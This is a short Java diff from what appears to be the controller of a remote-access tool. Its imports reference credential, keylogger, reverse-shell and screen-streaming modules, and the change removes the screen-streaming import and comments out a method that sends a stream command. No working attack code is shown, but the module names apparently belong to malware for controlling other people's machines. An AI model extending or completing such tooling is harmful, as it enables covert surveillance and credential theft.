@@ -7,7 +7,6 @@ import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import GUI.TableUtils.Permissions.Permissions;
 import GUI.TableUtils.ReverseShell.Shell;
-import GUI.TableUtils.ScreenStreaming.Screen;
 import GUI.TableUtils.SystemState.State;
 import Information.*;
 
@@ -364,7 +363,7 @@ public class Streams {
         }
         return 0;
     }
-
+/*
     public void sendAction(Screen action) throws IOException {
         JSONObject jsonObject = new JSONObject();
         if (action == Screen.STREAM) {
@@ -373,7 +372,7 @@ public class Streams {
             mainStream.sendString(jsonObject.toString());
         }
     }
-
+*/
 
     public void sendAction(ConnectionEnum action) throws IOException {
         JSONObject jsonObject = new JSONObject();
